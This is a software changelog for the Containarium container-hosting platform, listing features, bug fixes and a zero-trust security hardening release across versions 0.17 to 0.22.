- **Edge layer4 no longer deactivates on an empty route set**, fixing a create-flap. (#416)
- **`--http` CLI hardened against HTTP/2 edge resets** — pins HTTP/1.1, the ALPN to `http/1.1`, and drains response bodies. (#422, #468)
- **Incus exec retries the transient "Failed to retrieve PID" error.** (#425)

## [0.22.0] - 2026-05-31

Minor release: managed DNS-01 wildcard TLS, multi-domain Caddy apex management, fleet version visibility, and multi-key collaborators.

### Added

- **DNS-01 ACME for wildcard certs** — the core Caddy build now bundles the `caddy-dns` module, so the daemon issues/renews wildcard certificates via DNS-01 instead of per-host HTTP-01, with a single source of truth for the DNS-provider→module map. (#378)
- **Daemon Caddy-manages the apex of every `PublicBaseDomain`** — multi-base-domain support: each configured apex is served and auto-TLS'd. (#213)
- **Per-backend daemon version** in `get_system_info` and `/v1/backends`, so fleet version drift is visible without SSHing each host. (#354, Phase A0)
- **`GetLatestRelease` "update available" check** — the daemon can report whether a newer release exists. (#354, Phase A1)
- **`AddCollaborator` accepts multiple SSH keys** in a single call. (#369)
- **Sentinel HMAC-misconfig surfaced in `/status`** — a machine-readable `sentinel_auth_misconfigured` flag so monitoring can alert directly on the missing/short `CONTAINARIUM_SENTINEL_AUTH_SECRET` 401 loop. (#341, #373)
- **sshpiper-reload repro harness** (`hacks/repro/`) for validating hot-reload behavior (#301), with a single-VM Multipass bring-up. (#374)

### Fixed

- **App-side OpenTelemetry monitoring unblocked end-to-end** — the `--monitoring=true` ingest path now reaches the central collector. (#370, #371)

### Changed

- **Terraform module**: 0.9.x→0.21.x migration note plus a `sentinel_auth_secret` guard, so upgrades don't silently hit the HMAC 401 loop. (#375)

## [0.21.0] - 2026-05-29

Minor release: `--git-source` create plus a wake-on-HTTP fix.

### Added

- **`containarium create --git-source`** — the daemon fetches a git repo into the box at create time. (#363)

### Fixed

- **Wake-on-HTTP** returns 404 instead of a futile container start for routes with no backing container. (#362)

## [0.20.0] - 2026-05-29

Minor release: app-side OpenTelemetry distros for Python and Go, plus a wake-on-HTTP fix.

### Added

- **App-side OpenTelemetry distros for Python and Go** — `containarium-telemetry` (PyPI) and `github.com/footprintai/containarium/distros/go/containariumotel` ship as opinionated wrappers over the vanilla OTel SDKs. One-line init (`containarium_telemetry.init()` / `containariumotel.Init(ctx)`) wires the MeterProvider with the platform's resource attributes (`container.id`, `backend.id`, `service.namespace`, `service.version`) plus a defended `containarium.distro` support stamp, against the central collector that ships with `--monitoring=true`. See `docs/TELEMETRY-DISTRO-DESIGN.md`.

- **`containarium-instrument` console script** (Python) — always installed with the base package. Wraps `opentelemetry-instrument` so auto-instrumentation picks up the distro's defaults without app code changes. Adds `--dry-run` to print the resolved config (endpoint, redacted bearer headers, distro stamp) for first-line "why no metrics" debugging.

- **`containariumotel.HTTPMiddleware` + `containariumotel/grpc` sub-package** (Go) — thin wrappers over the canonical `otelhttp` / `otelgrpc` packages. gRPC ships as a sub-package so the gRPC transitive dependency only lands in apps that opt in.

- **`examples/helloworld-go`** — symmetric with the Python helloworld. Tiny HTTP server demonstrating Init + HTTPMiddleware + a hand-rolled `helloworld.requests` counter, plus a deploy.sh / systemd unit ready for the standard agent-native push flow.

- **CI workflows for the Python distro**: `distros-py-ci.yml` runs the test matrix (3.9, 3.10, 3.11, 3.12) on PRs touching `distros/py/**`; `distros-py-release.yml` publishes to PyPI via Trusted Publishing on every `v*` tag.

### Changed

- **`examples/helloworld-python` now uses `containarium-telemetry`** — two-line distro init in `app.py` plus a `helloworld.requests` counter, `requirements.txt` for the PyPI dep, and a `pip install --user` step added to `deploy.sh`. systemd unit unchanged.

- **`internal/metrics/otel.go` dogfoods the Go distro** — replaced the daemon's ad-hoc `otlpmetrichttp.New` / `resource.New` setup with `containariumotel.Init(ctx, WithServiceName, WithEndpoint, WithMetricInterval)`. `WithEndpoint` is the new distro option that wraps `otlpmetrichttp.WithEndpointURL` so callers that need a non-default ingest path (VictoriaMetrics' `/opentelemetry/api/v1/push`) don't have to fall back to env-only configuration.

### Fixed

- **wake-on-HTTP rejected every wake with "no authenticated subject in request context"** ([#357](https://github.com/FootprintAI/Containarium/pull/357)). The wake proxy invoked the container-start path with a bare `context.Background()`, so `StartContainer`'s authz gate (`RequireScope` + `AuthorizeTenant`) rejected the call — an inbound request routed to a scaled-down container returned `503 wake: start: ...` instead of waking it, making wake-on-HTTP (scale-down Phase 3) inert. Wake is a daemon-internal action triggered by a possibly-unauthenticated inbound request, so the proxy now stamps the `_system` identity (admin role, unrestricted scope) on the wake context — the same pattern the autosleep ticker and peer forwarders already use. Adds a regression test asserting the starter receives a system-identity context.

## [0.19.3] - 2026-05-27

Patch release fixing CI box creation on non-GCP backends.

### Fixed

- **jump-server: gate google-guest-agent / pwd-lock dance on GCP-only hosts** ([#351](https://github.com/FootprintAI/Containarium/issues/351) / [#352](https://github.com/FootprintAI/Containarium/pull/352)). The useradd precondition sequence — `systemctl stop google-guest-agent`, wait for `/etc/.pwd.lock` to clear, force-remove if stuck — was hardcoded for GCP VMs (where `google-guest-agent` races with local `useradd` via OS Login). On any non-GCP backend (VirtualBox lab spot, on-prem, AWS, Azure, …) the service doesn't exist; running the dance produced misleading "Access denied" stderr and force-removed lockfiles held legitimately by other processes, blocking every `containarium create` that landed on that backend.

  Fix: new `isGCPHost()` (backed by `systemd-detect-virt`, cached behind `sync.Once`) gates both `retryUseraddWithLockWait` and `waitForLocksAndRun`. Non-GCP hosts skip straight to the generic `flock + useradd` retry loop; GCP-VM deploys are byte-equivalent to v0.19.2. v0.19.2's "lacks privilege" final-error stops being misleading on non-GCP hosts — if useradd still fails after this, it's a real permission problem.

## [0.19.2] - 2026-05-27

Patch release covering the sentinel-side incident-response footguns shaken out during today's investigation: a silent tunnel-server enablement bug, three loopback / authorized-keys observability gaps that turned routine reconnects into hours-long operator drilling sessions, and the sentinel↔daemon HMAC misconfig that 401s every keysync without warning.

### Fixed

- **sentinel tunnel-server silently disabled when only `--tunnel-token-policy` is set** ([#337](https://github.com/FootprintAI/Containarium/issues/337) / [#344](https://github.com/FootprintAI/Containarium/pull/344)). Two gate conditions in `cmd/sentinel.go` checked `--tunnel-token != ""` but ignored `--tunnel-token-policy`; operators following the per-pool policy syntax got no listener and no error. Gates now accept either flag.

- **loopback aliases leaked on sentinel shutdown** ([#337](https://github.com/FootprintAI/Containarium/issues/337) follow-up / [#346](https://github.com/FootprintAI/Containarium/pull/346)). The per-spot `127.0.0.x` aliases persisted across restarts, blocking fresh allocations from the 127.0.0.2-254 pool. New `TunnelRegistry.UnregisterAll()` is `defer`-wired at both registry-creation sites; clean shutdown AND `SIGINT`/`SIGTERM` both drop every alias before exit.

- **HMAC sentinel-auth misconfig was silent** ([#341](https://github.com/FootprintAI/Containarium/issues/341) §1 / [#347](https://github.com/FootprintAI/Containarium/pull/347)). When `CONTAINARIUM_SENTINEL_AUTH_SECRET` was missing the daemon 401'd every protected request and the sentinel emitted unsigned requests forever — with only a single startup `WARNING` line that scrolled out of journals within hours. Both sides now log a rate-limited `WARNING` (once per 60s) on every actual cycle, so operators tailing the journal during an incident see the misconfig in real time.

- **stale `/authorized-keys` entries for deleted tenants** ([#343](https://github.com/FootprintAI/Containarium/issues/343) / [#348](https://github.com/FootprintAI/Containarium/pull/348)). When a tenant container was deleted but the host user / home dir survived (userdel lock contention, manual provisioning), sshpiper would accept the client's key and then the relay would fail mid-session with `Container <name>-container not found`. The keys endpoint now filters at read time using a `containerExistsFn` callback wired to the live container registry, and logs orphan entries with the exact cleanup command. Bonus: system accounts (`ubuntu`, `root`, anything in `/home` without a matching tenant) are also dropped from the response — they were always returned and were never valid sshpiper upstreams.

- **loopback alias allocator drifted upward across reconnects** ([#342](https://github.com/FootprintAI/Containarium/issues/342) / [#349](https://github.com/FootprintAI/Containarium/pull/349)). The previous `nextIP` cursor advanced monotonically and never rewound on `Unregister`, so a single backend that bounced landed on a different `127.0.0.X` each time. `allocateOctet(spotID)` now derives a deterministic preferred slot from `fnv32a(spotID) mod 253 + 2` and linear-probes only on collision. A backend that reconnects gets the same slot — sshpiper config stays valid through churn and `ss -tlnp` output matches the config.

### Known issues

- Sentinel `[keysync]`/`[certsync]` 401s against pre-tightening spots from the v0.18+ endpoint-auth change ([#345](https://github.com/FootprintAI/Containarium/issues/345)). Needs a design call on the sentinel↔spot trust model (PSK vs JWT vs mTLS); deferred.
- #341 §2 (deploy script auto-provisions the env var on upgrade) is a deploy-automation concern and tracked on the issue.

## [0.19.1] - 2026-05-27

Patch release fixing the embedded Grafana monitoring iframe on auth-enabled deploys.

### Fixed

- **monitoring iframe 401** ([#338](https://github.com/FootprintAI/Containarium/issues/338) / [#339](https://github.com/FootprintAI/Containarium/pull/339)). The webui's monitoring page iframes `/grafana/d/...` on the same origin, but browsers can't attach `Authorization: Bearer …` headers to `<iframe src=…>` loads — so every embedded Grafana request hit the daemon's auth middleware bare and got `{"error":"missing authorization header","code":401}`. The page was functionally broken on any deploy with auth enabled.

  Fix: the daemon's `auth.AuthMiddleware.HTTPMiddleware` now accepts a `containarium_session` cookie as a fallback to the bearer header (bearer still wins when both are present). New `POST/DELETE /v1/auth/session` endpoint promotes/clears the cookie (HttpOnly, SameSite=Lax, Secure unconditionally, Max-Age bounded by JWT lifetime). The webui calls the promote endpoint on monitoring-page mount before painting the iframe. Cookie value is the raw JWT — no new credential material, no change to revocation / expiry / refresh-token rejection semantics. CLI/MCP/API clients see no behavior change.

### Known issues

- The sentinel's `tunnel-server` silently fails to accept tunnel-client connections when `--tunnel-token` is omitted in favor of policy-only flags ([#337](https://github.com/FootprintAI/Containarium/issues/337)). Workaround documented on the issue; fix deferred to a follow-up release.

## [0.19.0] - 2026-05-27

Headline: **agent-box reaches the CI surface** — the platform now provisions GitHub-Actions ephemeral runners, owns the compose-autostart contract end-to-end, and ships the MCP / CLI surface (`login`, `whoami`, `ssh setup`, `runner provision`, compose-autostart tools) that lets an agent or a script drive a Containarium host without hand-rolling SSH glue. Plus the trailing useradd-on-jumpserver fixes that closed [`cloud#163`](https://github.com/FootprintAI/Containarium-cloud/issues/163).

### Added — CI runner pool

- **Runner kit** ([#302](https://github.com/FootprintAI/Containarium/pull/302), [#304](https://github.com/FootprintAI/Containarium/pull/304)) — Containarium as a GHA ephemeral runner pool; `containarium runner provision` CLI + MCP tool spins one up agent-driven.
- **Pattern B docs** ([#303](https://github.com/FootprintAI/Containarium/pull/303)) — runner orchestrates nested per-job, with the trade-offs vs. flat pools written down.

### Added — compose-autostart end-to-end

- **Phase B** — agent-box MCP tools ([#310](https://github.com/FootprintAI/Containarium/pull/310))
- **Phase C** — daemon proto + RPC + CLI ([#317](https://github.com/FootprintAI/Containarium/pull/317), [#323](https://github.com/FootprintAI/Containarium/pull/323), [#324](https://github.com/FootprintAI/Containarium/pull/324))
- **Phase D** — `containarium create --auto-restart-compose=<dir>` ([#326](https://github.com/FootprintAI/Containarium/pull/326))
- **Platform compose-autostart MCP tools** ([#325](https://github.com/FootprintAI/Containarium/pull/325))
- **Design note** ([#309](https://github.com/FootprintAI/Containarium/pull/309)) — captures why this lands platform-level rather than per-image.

### Added — CLI / MCP surface

- **`containarium login` / `logout` / `whoami`** ([#305](https://github.com/FootprintAI/Containarium/pull/305)) — A3 of the agent-onboarding plan; replaces ad-hoc `~/.containarium/credentials.json` editing.
- **`containarium ssh setup` / `list` / `remove` / `propagate`** + **`login --with-ssh-setup`** ([#307](https://github.com/FootprintAI/Containarium/pull/307)) — A5/A6/A7; one-shot SSH key onboarding from any client.
- **MCP credentials.json fallback for token** ([#311](https://github.com/FootprintAI/Containarium/pull/311)) — A4; MCP tools pick up the credentials file when no env token is set.
- **TTL CLI verbs** — `containarium ttl set / get / unset` ([#297](https://github.com/FootprintAI/Containarium/pull/297)) for box auto-delete scheduling.
- **TTL sweeper + handler** ([#299](https://github.com/FootprintAI/Containarium/pull/299), [#300](https://github.com/FootprintAI/Containarium/pull/300)) — proto RPC + decision logic + keep-on-failure chain.
- **Agent-box CI MCP resources** ([#298](https://github.com/FootprintAI/Containarium/pull/298), [#296](https://github.com/FootprintAI/Containarium/pull/296)) — `ci-context` + `ci-prompt` resources with an opinionated debug playbook.
- **Post-login banner rotation hint** ([#333](https://github.com/FootprintAI/Containarium/pull/333)) — K2; banner now nudges users toward token rotation.
- **Env-var defaults + CLI-only install script** ([#295](https://github.com/FootprintAI/Containarium/pull/295)) — unblocks the GHA Action path.

### Added — Air-gapped install + ebpf

- **Air-gapped install bundle** ([#308](https://github.com/FootprintAI/Containarium/pull/308), E3b) — `offline-install.sh`, release-pipeline matrix, GHES support.
- **ebpf Phase 0** ([#292](https://github.com/FootprintAI/Containarium/pull/292)) — bridge-attach validator (shell + Go paths).

### Fixed — Jump-server useradd reliability

The fail-fast + serialization fixes that took the useradd path from "retries-until-misleading-lock-error" to "errors clearly, immediately":

- **Surface useradd output when all retries exhaust** ([#320](https://github.com/FootprintAI/Containarium/pull/320)) — `lastOutput` captured so the final error includes the real stderr.
- **Fail-fast on `Permission denied`** ([#322](https://github.com/FootprintAI/Containarium/pull/322), closes [containarium-run#15](https://github.com/FootprintAI/containarium-run/issues/15)) — distinguishes "non-root can't write /etc/passwd" from "transient lock," fails immediately on the former.
- **Serialize useradd + exponential backoff + mid-loop lock cleanup** ([#335](https://github.com/FootprintAI/Containarium/pull/335), closes [cloud#163](https://github.com/FootprintAI/Containarium-cloud/issues/163)) — concurrent useradds no longer thrash; stale locks get cleaned up between attempts.

### Fixed — Other

- **`containarium version` subcommand on install** ([#321](https://github.com/FootprintAI/Containarium/pull/321)) — installer now uses the actual subcommand rather than `--version` which isn't a flag.

### Tests / Docs

- **MCP K3 + K4 + K5 + 60-second doc** ([#334](https://github.com/FootprintAI/Containarium/pull/334)) — API-token verify tests + new operator quickstart.
- **VM-migration plan + OSS-disclosure rule** ([#313](https://github.com/FootprintAI/Containarium/pull/313)) — host→VM migration plan written down; CLAUDE.md gains a rule on what may leak into OSS commits.

### Chores

- **Scrub leaked deploy tokens + apply OSS-anonymization rule** ([#314](https://github.com/FootprintAI/Containarium/pull/314)) — closes a token leak from an earlier commit; the rule from #313 in force from here on.
- **Dependencies**: bumps for `google.golang.org/api`, `grpc-gateway/v2`, `mcp-go`, `pgx/v5`, `cloud.google.com/go/compute`, and `docker/setup-buildx-action` ([#319](https://github.com/FootprintAI/Containarium/pull/319), [#327](https://github.com/FootprintAI/Containarium/pull/327), [#328](https://github.com/FootprintAI/Containarium/pull/328), [#329](https://github.com/FootprintAI/Containarium/pull/329), [#330](https://github.com/FootprintAI/Containarium/pull/330), [#332](https://github.com/FootprintAI/Containarium/pull/332)).

## [0.18.0] - 2026-05-22

Ships the **zero-trust security audit remediation** — 46 PRs across 5 phases closing all 41 numbered findings from the internal audit ([`docs/security/ZERO-TRUST-AUDIT.md`](docs/security/ZERO-TRUST-AUDIT.md)). The headline shifts: every API surface is now authenticated by scope, every secret is decryptable through a pluggable KMS, every audit log row is in a tamper-evident hash chain, and every container-image pull is verified against the registry's published digest. Operators get a full runbook at [`docs/security/OPERATOR-SECURITY-RUNBOOK.md`](docs/security/OPERATOR-SECURITY-RUNBOOK.md).

### Security — Authentication & RBAC

- **JWT hardening — `iss` / `aud` / minimum secret length** ([#231](https://github.com/FootprintAI/Containarium/pull/231)). Every issued token now carries `iss=containarium` + `aud=containarium-api`; ValidateToken refuses tokens missing either. Daemon refuses to start with a JWT secret shorter than 32 bytes.
- **Refresh-token rotation (`tt` claim)** ([#254](https://github.com/FootprintAI/Containarium/pull/254), [#255](https://github.com/FootprintAI/Containarium/pull/255)). Tokens now carry `tt=access|refresh`; only `access` authenticates the API surface. New `RefreshToken` RPC mints a fresh `(access, refresh)` pair and revokes the input refresh token's `jti` — refresh tokens are single-use. Replay returns Unauthenticated.
- **JWT revocation (`jti` + revocation list)** ([#248](https://github.com/FootprintAI/Containarium/pull/248), [#249](https://github.com/FootprintAI/Containarium/pull/249), [#252](https://github.com/FootprintAI/Containarium/pull/252), [#278](https://github.com/FootprintAI/Containarium/pull/278), [#279](https://github.com/FootprintAI/Containarium/pull/279)). Every token carries a `jti` claim; new Postgres-backed `RevocationStore` rejects revoked tokens at auth time. Operator surface: `containarium token {revoke,list-revoked,inspect}`, MCP `revoke_token` tool (`tokens:write` scope), `RevokeToken` / `ListRevokedTokens` RPCs.
- **Per-tool MCP scopes** ([#250](https://github.com/FootprintAI/Containarium/pull/250)). MCP tokens can be issued with narrow `--scopes` (e.g. `containers:read`, `secrets:write`); each tool checks its required scope, returning least-privilege-friendly errors instead of running.
- **Daemon-side scope enforcement on REST/gRPC** ([#251](https://github.com/FootprintAI/Containarium/pull/251), [#253](https://github.com/FootprintAI/Containarium/pull/253), [#265](https://github.com/FootprintAI/Containarium/pull/265), [#266](https://github.com/FootprintAI/Containarium/pull/266)). Scope claims now propagate end-to-end and gate every server-side handler — agent-side scope filtering can't be the only barrier.
- **Admin RBAC on cluster-level ops** ([#234](https://github.com/FootprintAI/Containarium/pull/234), [#246](https://github.com/FootprintAI/Containarium/pull/246), [#247](https://github.com/FootprintAI/Containarium/pull/247)). 33 cluster-wide RPCs now require the `admin` role; container-scoped RPCs additionally require ownership match (`container_name` → owner authz on 7 endpoints including traffic and ClamAV).
- **WebSocket subprotocol auth** ([#245](https://github.com/FootprintAI/Containarium/pull/245)). Terminal + SSE WebSockets now authenticate via Sec-WebSocket-Protocol bearer rather than `?token=` query parameters, which leak through proxies and access logs.
- **Endpoint-auth tightening** ([#233](https://github.com/FootprintAI/Containarium/pull/233)). All non-public endpoints now require valid JWT; previously-anonymous paths gated.

### Security — Secrets & KMS envelope encryption

- **KMS envelope encryption** (audit C-HIGH-6) — full 6-phase rollout that lets operators pull the decrypt key off the daemon host into a managed KMS.
  - **Phase A** — `KMSClient` interface + in-process no-op impl ([#268](https://github.com/FootprintAI/Containarium/pull/268))
  - **Phase B** — Store envelope-path wiring, dual-mode reads ([#269](https://github.com/FootprintAI/Containarium/pull/269))
  - **Phase D** — legacy→envelope migration tool + coverage CLI ([#270](https://github.com/FootprintAI/Containarium/pull/270))
  - **Phase E** — `CONTAINARIUM_REQUIRE_ENVELOPE=true` retirement gate ([#272](https://github.com/FootprintAI/Containarium/pull/272))
  - **Phase F** — Vault Transit backend (raw HTTP, no SDK dependency) ([#271](https://github.com/FootprintAI/Containarium/pull/271))
  - **Phase C** — Google Cloud KMS backend ([#281](https://github.com/FootprintAI/Containarium/pull/281))
- **tmpfs secret delivery** (audit C-MED-4) — new `--delivery=file` mode writes secrets to `/run/secrets/<NAME>` (tmpfs, mode `0440 root:<tenant>`) instead of env vars, which are visible in `/proc/<pid>/environ` to anyone who can shell into the container.
  - **Phase A** — field plumbing ([#274](https://github.com/FootprintAI/Containarium/pull/274))
  - **Phase B-1** — file writer ([#275](https://github.com/FootprintAI/Containarium/pull/275))
  - **Phase B-2** — chown to tenant user ([#276](https://github.com/FootprintAI/Containarium/pull/276))
  - **Phase B-3** — re-stamping reconciler (60s tick) ([#277](https://github.com/FootprintAI/Containarium/pull/277))
- **Postgres credentials from secret-file** ([#260](https://github.com/FootprintAI/Containarium/pull/260)). New `CONTAINARIUM_POSTGRES_URL_FILE` / `_PASSWORD_FILE` env vars let operators store DB credentials at `0600` files instead of inline env. Permissions checked at load.
- **Master-key file permission check** ([#235](https://github.com/FootprintAI/Containarium/pull/235)). Daemon refuses to start if `/etc/containarium/secrets.key` has any non-owner bit set — catches umask drift and ownership change.

### Security — Audit log & tamper evidence

- **Audit-log hash chain** ([#243](https://github.com/FootprintAI/Containarium/pull/243)). Every audit row now carries `prev_hash` + `row_hash` (Phase 4.5). `SELECT FOR UPDATE` on the chain tail serializes concurrent appends; a tampered row breaks the chain and is detected by `containarium audit verify`.
- **Audit hygiene** ([#242](https://github.com/FootprintAI/Containarium/pull/242)). Sensitive fields (tokens, passwords, key material) redacted at insert; request-correlation IDs propagated end-to-end; tightened file permissions on audit artifacts.
- **Operator-facing audit CLI** ([#280](https://github.com/FootprintAI/Containarium/pull/280)). `containarium audit query` filters by username/action/resource-type/time-range; `containarium audit verify` walks the hash chain in batches and reports the first broken row. Direct Postgres access; no daemon route needed.

### Security — Supply-chain (image digest verification)

- **Registry allowlist + operator-enforced digest pinning** ([#236](https://github.com/FootprintAI/Containarium/pull/236), [#261](https://github.com/FootprintAI/Containarium/pull/261)). `CONTAINARIUM_ALLOWED_IMAGE_REGISTRIES` restricts which simplestreams remotes are reachable; `CONTAINARIUM_REQUIRE_IMAGE_DIGEST` forces every image reference to end with `@sha256:<64-hex>` (sha256 only, lowercase-hex).
- **Full registry-side digest verification** (audit B-HIGH-1) — end-to-end pull-byte verification gated by a single env var.
  - **Design** — pre-pull simplestreams resolve + post-pull defense-in-depth ([#282](https://github.com/FootprintAI/Containarium/pull/282))
  - **Phase A** — simplestreams index resolver ([#283](https://github.com/FootprintAI/Containarium/pull/283))
  - **Phase B** — `CONTAINARIUM_VERIFY_IMAGE_DIGEST=true` pre-pull gate ([#284](https://github.com/FootprintAI/Containarium/pull/284))
  - **Phase D** — operator runbook + soak-mode rollout pattern ([#285](https://github.com/FootprintAI/Containarium/pull/285))
  - **Phase C** — post-pull `volatile.base_image` fingerprint check (defense-in-depth) ([#288](https://github.com/FootprintAI/Containarium/pull/288))
  - **Follow-ups** — VERIFY-without-REQUIRE startup WARNING + abuse tripwires ([#286](https://github.com/FootprintAI/Containarium/pull/286)); TTL cache for the simplestreams resolver ([#287](https://github.com/FootprintAI/Containarium/pull/287))

### Security — Sentinel, TLS, and operational hardening

- **`/wake/` source-IP allowlist** ([#244](https://github.com/FootprintAI/Containarium/pull/244)). Wake-on-HTTP rejects callers outside `CONTAINARIUM_WAKE_TRUSTED_PROXIES`; before, anyone on the daemon's network could trigger a wake by crafting `Host`.
- **MCP HTTPS pinning + OTel bind override** ([#238](https://github.com/FootprintAI/Containarium/pull/238)). MCP tools refuse non-HTTPS daemon URLs unless explicitly opted in; OTel receiver bind is operator-configurable rather than wildcard-default.
- **Fail-closed startup checks** ([#235](https://github.com/FootprintAI/Containarium/pull/235)). Daemon refuses to start when a JWT secret is configured but unreadable, or when `REQUIRE_ENVELOPE=true` but no KMS backend is wired.
- **Terraform firewall tightening** ([#237](https://github.com/FootprintAI/Containarium/pull/237)). Sentinel SSH port narrowed from `22` (open to `0.0.0.0/0`) to operator-supplied allowlist; defaults removed. IAP-only mode for management access.
- **OTel collector-side bearer enforcement** ([#263](https://github.com/FootprintAI/Containarium/pull/263), [#264](https://github.com/FootprintAI/Containarium/pull/264), audit C-HIGH-5 closed). Collector now rejects un-bearered OTLP submissions when `OTEL_BEARER_REQUIRED=true`; daemon stamps the bearer header on monitoring-enabled containers.
- **Input bounds + explicit SSH-key newline check** ([#240](https://github.com/FootprintAI/Containarium/pull/240)). `CreateContainer` rejects oversized `ssh_keys` / `stack_parameters` / `labels`; SSH-key validator rejects embedded `\r\n` before base64-decode (previously rejection was incidental, not load-bearing).
- **Operational hardening pass** ([#239](https://github.com/FootprintAI/Containarium/pull/239), [#241](https://github.com/FootprintAI/Containarium/pull/241)). gosec inline directives, tightened file modes on operator-generated artifacts.

### Security — Process & tooling

- **`/swagger-ui/` gated behind admin role** ([#256](https://github.com/FootprintAI/Containarium/pull/256), audit A-LOW-1).
- **CI security scanners verified** ([#257](https://github.com/FootprintAI/Containarium/pull/257)). `gosec`, `govulncheck`, `trivy` all run on push, PR, and weekly; SARIF uploads to GitHub code scanning; `govulncheck` fails the build on known-fixed vulns.
- **`SECURITY.md` published** ([#257](https://github.com/FootprintAI/Containarium/pull/257)). Disclosure policy, SLAs, 90-day coordinated-disclosure window, scope.
- **Abuse-case regression suite** ([#259](https://github.com/FootprintAI/Containarium/pull/259), audit Phase 5.4). 12 scenarios in `internal/auth/abuse_test.go` — revoked-token replay, refresh-rotation replay, wrong-tenant access, scope confusion, tampered signature, `alg=none` confusion, etc. — that all MUST fail closed. CI tripwire for any future refactor that flips a deny to allow.

### Added — CLI / MCP surface

- **`containarium audit query` / `audit verify`** ([#280](https://github.com/FootprintAI/Containarium/pull/280)).
- **`containarium token revoke` / `list-revoked` / `inspect`** ([#249](https://github.com/FootprintAI/Containarium/pull/249), [#278](https://github.com/FootprintAI/Containarium/pull/278), [#279](https://github.com/FootprintAI/Containarium/pull/279)).
- **`containarium secrets migrate-to-envelope` / `envelope-coverage`** ([#270](https://github.com/FootprintAI/Containarium/pull/270)).
- **`containarium secrets set --delivery=env|file`** ([#274](https://github.com/FootprintAI/Containarium/pull/274)).
- **`RefreshToken` REST / gRPC endpoint** at `POST /v1/tokens/refresh` ([#255](https://github.com/FootprintAI/Containarium/pull/255)).
- **`RevokeToken` / `ListRevokedTokens` REST / gRPC endpoints** at `POST /v1/tokens/revoke` and `GET /v1/tokens/revoked` ([#249](https://github.com/FootprintAI/Containarium/pull/249), [#278](https://github.com/FootprintAI/Containarium/pull/278)).
- **MCP `revoke_token`** tool ([#252](https://github.com/FootprintAI/Containarium/pull/252)).

### Documentation

- **Zero-trust audit and remediation TODO** at [`docs/security/ZERO-TRUST-AUDIT.md`](docs/security/ZERO-TRUST-AUDIT.md) and [`docs/security/ZERO-TRUST-TODO.md`](docs/security/ZERO-TRUST-TODO.md) — full audit, all 41 numbered items now `[x]`.
- **Operator security runbook** at [`docs/security/OPERATOR-SECURITY-RUNBOOK.md`](docs/security/OPERATOR-SECURITY-RUNBOOK.md) ([#262](https://github.com/FootprintAI/Containarium/pull/262), expanded across the session). Covers token lifecycle, leak response, agent-token least-privilege, JWT/Postgres credential rotation, KMS envelope rollout for both Vault and GCP, image digest pinning + verification, auditing administrative actions, `/wake/` lockdown.
- **Design notes** at [`docs/security/KMS-ENVELOPE-DESIGN.md`](docs/security/KMS-ENVELOPE-DESIGN.md), [`docs/security/IMAGE-DIGEST-VERIFY-DESIGN.md`](docs/security/IMAGE-DIGEST-VERIFY-DESIGN.md), [`docs/security/SECRETS-ENV-VAR-RISK.md`](docs/security/SECRETS-ENV-VAR-RISK.md) ([#258](https://github.com/FootprintAI/Containarium/pull/258), [#267](https://github.com/FootprintAI/Containarium/pull/267)) — threat model + multi-phase rollout for each major remediation.
- **Phase-0 operator runbook** at [`docs/security/PHASE-0-OPERATOR-RUNBOOK.md`](docs/security/PHASE-0-OPERATOR-RUNBOOK.md) ([#232](https://github.com/FootprintAI/Containarium/pull/232)).
- **README architecture and security sections** updated to reflect the new gates and env-var surface.

### Breaking

- **JWT validation now requires `iss` and `aud`**. Tokens minted by older `containarium token generate` (pre-#231) won't validate. Operators must re-mint any long-lived tokens — `containarium token inspect <token>` shows whether the claims are present.
- **`/swagger-ui/` requires admin auth** ([#256](https://github.com/FootprintAI/Containarium/pull/256)). Unauthenticated callers get 401; non-admin callers get 403.
- **WebSocket auth via `?token=` is removed** ([#245](https://github.com/FootprintAI/Containarium/pull/245)). Clients must use the `Sec-WebSocket-Protocol` subprotocol form. The CLI was updated in the same PR; out-of-tree integrations need to follow.
- **Terraform sentinel SSH default narrowed** ([#237](https://github.com/FootprintAI/Containarium/pull/237)). New deployments require an explicit `allowed_ssh_sources` rather than getting `0.0.0.0/0`. Existing deployments are not auto-tightened — operators flip the var to opt in.

## [0.17.0] - 2026-05-18

Ships **pool-aware container placement and per-pool base-domain SNI routing** end-to-end. A single sentinel can now front multiple parent domains, and a single backend can host workloads under several of them — enabling consolidation across previously-separate clusters without merging their app domains.

### Added

- **Pool selector for container placement** ([#204](https://github.com/FootprintAI/Containarium/pull/204)) — `--pool` flag on `containarium create` (and matching `pool` arg on the MCP `create_container` tool) routes a new container to any healthy backend tagged with that pool. Validates consistency when both `--pool` and `--backend-id` are set; errors on no-matching-backend rather than silently falling back. The `Container` message now round-trips the `pool` field on Create / List / Get responses so callers can see where their container actually landed. Foundation for sharing one control plane across physically-separated workloads.
- **Per-pool base-domain SNI routing** ([#205](https://github.com/FootprintAI/Containarium/pull/205)) — primaries advertise one or more `--public-base-domain` values; the sentinel's SNI router suffix-matches inbound TLS against them after exact-`Hostname`/`Alias` matching and before the legacy fallback. Removes the requirement to register every container hostname as an explicit `--public-aliases` entry. Longest-suffix-wins for nested base domains; ties across primaries fail closed rather than picking arbitrarily.
- **Multi-domain primaries** ([#207](https://github.com/FootprintAI/Containarium/pull/207)) — `--public-base-domain` is now repeatable on both `containarium daemon` and `containarium tunnel`, so one backend can host workloads under several parent domains simultaneously. Enables a single peer to serve, for example, both its own pool's subdomain space and migrated workloads published under a different parent.
- **`MonitoringEnabled` column in `containarium list`** ([#202](https://github.com/FootprintAI/Containarium/pull/202)) — the new `MON` column makes it visible at a glance which containers have application-emitted OTel turned on.

### Fixed

- **Per-container disk usage on the `dir` storage backend** ([#203](https://github.com/FootprintAI/Containarium/pull/203)) — `containarium list`, MCP `get_metrics`, and the OTel collector all reported 0 B for disk usage on hosts that init Incus with the `dir` driver (e.g. lab boxes without a zpool). Incus only fills `state.Disk["root"].Usage` when the backend has filesystem-level quota accounting (zfs / btrfs); on dir backends the field stays empty and there was no fallback. `GetContainerMetrics` now walks the container's rootfs (`/var/lib/incus/storage-pools/<pool>/containers/<name>/rootfs`, same path `du -bs` would) and reports the sum. The walk runs only when Incus's native value is zero, so zfs / btrfs hosts pay nothing.

### Documentation

- **Per-pool base-domain design** ([#205](https://github.com/FootprintAI/Containarium/pull/205), [#207](https://github.com/FootprintAI/Containarium/pull/207)) — `docs/PER-POOL-BASE-DOMAIN.md` covers the SNI router precedence, longest-wins / fail-closed semantics, and the lab-hosts-multiple-domains worked example.
